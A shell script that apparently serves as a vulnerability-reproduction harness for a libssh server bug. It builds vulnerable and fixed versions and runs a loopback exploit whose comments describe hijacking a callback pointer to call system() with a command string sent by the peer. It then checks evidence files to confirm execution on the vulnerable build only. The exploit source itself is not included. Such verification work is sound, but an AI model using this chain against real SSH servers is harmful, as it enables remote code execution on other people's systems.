#!/bin/sh
# W25 additive lane: W24's wire-resident callback iterator and W16's
# wire-resident command string are combined with a direct library call to
# libc system(). The callback function pointer and the string system() reads
# are both bytes the authenticated peer sent into the recycled channel; no
# app-owned trampoline or command string is on the executed path. Built
# against the same two pinned commits, ASan, loopback only.
set -u
cd "$(dirname "$0")" || exit 1
HERE=$(pwd)

V=a540e27659b08828ef61f2910a790f7cf2af9f8d
F=7dfabb1fd213196c4912c314b418ff36c882ea54
VS=libssh-mirror-$V
FS=libssh-mirror-$F

provision() {
    sha=$1; dir=$2
    if [ ! -d "$dir" ]; then
        curl -fsSL --max-time 60 \
            "https://codeload.github.com/libssh/libssh-mirror/tar.gz/$sha" \
            -o "$dir.tar.gz" || return 1
        tar -xzf "$dir.tar.gz" || return 1
    fi
}

build_asan() {
    dir=$1; out=$2
    cmake -S "$dir" -B "$out" -G Ninja \
        -DCMAKE_BUILD_TYPE=Debug -DCMAKE_C_COMPILER=clang \
        -DWITH_SERVER=ON -DUNIT_TESTING=OFF -DBUILD_SHARED_LIBS=OFF \
        -DWITH_GSSAPI=OFF -DWITH_ZLIB=OFF >"$out.configure.log" 2>&1 &&
    ninja -C "$out" ssh >"$out.build.log" 2>&1
}

provision "$V" "$VS" && provision "$F" "$FS" || exit 1
for pair in "$VS build-asan vuln" "$FS build-fixed fixed"; do
    set -- $pair
    src=$1; b=$2; kind=$3
    build_asan "$src" "$b" || exit 1
    clang -std=gnu99 -O1 -g -fsanitize=address -fno-omit-frame-pointer \
        -DW13_INLINE -DW14_REALSYSTEM -DW16_WIRECMD -DW24_WIRELIST \
        -DW25_SYSWIRE \
        -I"$b/src" -I"$src/src" -I"$src/include" -I"$b/include" -I"$b" \
        real_wire.c "$b/src/libssh.a" -lcrypto -lpthread -ldl \
        -o "real_wire-sw-$kind" || exit 1
done

if [ ! -f hostkey ]; then
    ssh-keygen -q -t ed25519 -N '' -f hostkey </dev/null >/dev/null 2>&1 || exit 1
fi

# Probe in this exact build: the allocator slot shifts with build path.
mkdir -p syswire-run/probe
ln -sf "$HERE/hostkey" syswire-run/probe/hostkey
(cd syswire-run/probe && \
    ASAN_OPTIONS=detect_leaks=0:quarantine_size_mb=0 timeout 25 \
    "$HERE/real_wire-sw-vuln" ./hostkey groom-nodetach-bare) \
    >evidence-sw-probe.out 2>&1
slot=$(grep -o 'SERVER groom alloc=0x[0-9a-f]*' evidence-sw-probe.out |
       head -1 | sed 's/.*alloc=//')
if [ -z "$slot" ]; then
    echo "probe failed; no channel slot"
    exit 1
fi
echo "probe slot=$slot"

PASS=0; FAIL=0
run_lane() {
    n_name=$1; n_kind=$2; n_mode=$3
    mkdir -p "syswire-run/$n_name"
    ln -sf "$HERE/hostkey" "syswire-run/$n_name/hostkey"
    (cd "syswire-run/$n_name" && \
        ASAN_OPTIONS=detect_leaks=0:quarantine_size_mb=0 timeout 25 \
        "$HERE/real_wire-sw-$n_kind" ./hostkey "$n_mode" "$slot") \
        >"evidence-sw-$n_name.out" 2>&1
    echo "lane $n_name rc=$?"
}

marker_present() {
    [ -f "syswire-run/$1/evidence-wire-syswire.marker" ] && echo yes || echo no
}

check_vuln() {
    c_out=evidence-sw-$1.out
    c_file=$(marker_present "$1")
    c_d2=$(grep -c 'SERVER data #2' "$c_out")
    c_t=$(grep -c 'SERVER target_after=0x41414141414141c1' "$c_out")
    c_arm=$(grep -c 'SERVER SYSWIRE armed' "$c_out")
    c_e=$(grep -c 'SERVER EXEC trampoline' "$c_out")
    c_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$c_out")
    c_cl=$(grep -c 'CLIENT syswire fn=0x' "$c_out")
    c_w=$(grep -c 'SERVER wirelist it=' "$c_out")
    if [ "$c_d2" = 1 ] && [ "$c_t" = 1 ] && [ "$c_arm" = 1 ] &&
       [ "$c_e" = 0 ] && [ "$c_ok" = 1 ] && [ "$c_cl" = 1 ] &&
       [ "$c_w" = 1 ] && [ "$c_file" = yes ]; then
        PASS=$((PASS+1)); echo "PASS-$1 data2=$c_d2 target=$c_t armed=$c_arm trampoline=$c_e wirelist=$c_w file=$c_file"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1 got[$c_d2 $c_t $c_arm $c_e $c_ok $c_cl $c_w $c_file]"
    fi
}

check_fixed() {
    c_out=evidence-sw-$1.out
    c_file=$(marker_present "$1")
    c_d2=$(grep -c 'SERVER data #2' "$c_out")
    c_arm=$(grep -c 'SERVER SYSWIRE armed' "$c_out")
    c_e=$(grep -c 'SERVER EXEC trampoline' "$c_out")
    c_w=$(grep -c 'SERVER wirelist it=' "$c_out")
    if [ "$c_d2" = 0 ] && [ "$c_arm" = 0 ] && [ "$c_e" = 0 ] &&
       [ "$c_w" = 0 ] && [ "$c_file" = no ]; then
        PASS=$((PASS+1)); echo "PASS-$1 data2=0 armed=0 trampoline=0 wirelist=0 file=no"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1 got[$c_d2 $c_arm $c_e $c_w $c_file]"
    fi
}

run_lane vuln-syswire vuln groom-syswire
check_vuln vuln-syswire
if [ -f syswire-run/vuln-syswire/evidence-wire-syswire.marker ]; then
    mv syswire-run/vuln-syswire/evidence-wire-syswire.marker \
       evidence-sw-sideeffect.kept
fi

run_lane fixed-syswire fixed groom-syswire
check_fixed fixed-syswire

# Wire-chosen callee control: an invalid callee must fault at the library call.
run_lane vuln-syswire-bad vuln groom-syswire-bad
b_out=evidence-sw-vuln-syswire-bad.out
b_status=$(grep -c 'CLIENT rc=0 SERVER status=0x' "$b_out")
b_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$b_out")
b_arm=$(grep -c 'SERVER SYSWIRE armed' "$b_out")
b_file=$(marker_present vuln-syswire-bad)
b_done=$(grep -c 'SERVER done data_packets=2' "$b_out")
if [ "$b_status" = 1 ] && [ "$b_ok" = 0 ] && [ "$b_arm" = 1 ] &&
   [ "$b_file" = no ] && [ "$b_done" = 0 ]; then
    PASS=$((PASS+1)); echo "PASS-vuln-syswire-bad server_fault=yes armed=$b_arm marker=no server_done=no"
else
    FAIL=$((FAIL+1)); echo "FAIL-vuln-syswire-bad got[status=$b_status clean=$b_ok armed=$b_arm marker=$b_file done=$b_done]"
fi

for i in 1 2 3; do
    run_lane "vuln-repeat$i" vuln groom-syswire
    check_vuln "vuln-repeat$i"
    if [ -f "syswire-run/vuln-repeat$i/evidence-wire-syswire.marker" ]; then
        mv "syswire-run/vuln-repeat$i/evidence-wire-syswire.marker" \
           "evidence-sw-repeat$i.kept"
    fi
done

echo "syswire: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
